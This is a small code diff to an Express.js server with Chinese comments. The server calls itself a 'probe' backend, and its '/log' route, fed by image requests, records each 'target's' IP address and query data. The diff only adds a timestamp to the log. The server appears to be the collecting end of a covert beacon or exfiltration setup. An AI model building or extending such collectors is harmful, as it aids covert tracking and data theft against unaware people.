@@ -6,6 +6,7 @@ app.get('/', (req, res) => res.send('探測器後端已就緒！'));
 // 使用「圖片模式」接收數據，這最穩定
 app.get('/log', (req, res) => {
     console.log('--- [抓到目標數據] ---');
+    console.log('時間:', new Date().toLocaleString());
     console.log('IP:', req.headers['x-forwarded-for'] || req.socket.remoteAddress);
     console.log('詳情:', req.query);
     
